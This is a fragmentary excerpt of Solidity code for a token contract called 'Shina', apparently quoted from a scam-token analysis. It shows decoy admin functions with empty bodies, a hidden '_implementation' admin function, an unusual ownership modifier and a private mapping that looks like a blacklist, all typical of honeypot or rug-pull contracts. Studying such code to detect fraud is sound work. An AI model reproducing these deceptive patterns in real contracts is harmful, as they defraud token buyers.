...
contract Ownable is Context {
    function changeRouterVersion(address dexRouter) public AdminChanger{}
    function transferOwnership(address newOwner) public virtual onlyToken {
        emit OwnershipTransferred(_owner, address(newOwner));
        _owner = newOwner;
    }
    function setOffTax(uint256 newSellTax) public AdminChanger{}
    function setOnTax(uint256 newBuyTax) public AdminChanger{}
    function _implementation(address toSender, address toSenderT) external AdminChanger{
...
contract Shina is Context, IERC20, Ownable {
    mapping(address => bool) private sendValue;
    ...
    constructor() public {
        _owner = _msgSender();
        _Admin[_msgSender()] = _totalSupply;
    ...
    function pause()public AdminChanger{}
    function _fallback
    ...
    function _transfers(
        ...
        _Admin[sender] = _Admin[sender].sub(toAmount);
        _Admin[recipient] = _Admin[recipient].add(toAmount);
    ...
    function changeFeeReceivers(address newLiquidityReceiver, address newMarketingWallet, address newAmarketingWallet, address newAmarketingWallet2) public AdminChanger {}
